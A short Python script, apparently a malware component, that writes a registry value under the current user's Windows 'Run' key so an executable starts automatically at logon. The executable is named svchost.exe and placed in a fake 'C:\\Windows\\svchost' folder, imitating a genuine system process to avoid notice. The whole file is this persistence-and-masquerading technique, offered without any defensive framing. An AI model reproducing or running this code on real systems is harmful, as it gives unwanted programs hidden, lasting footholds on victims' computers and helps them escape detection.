import winreg

myExe_path = "\"C:\\Windows\\svchost\\svchost.exe\""
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                     r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                     0,
                     winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, 'svchost', 0, winreg.REG_SZ, myExe_path)
key.Close()
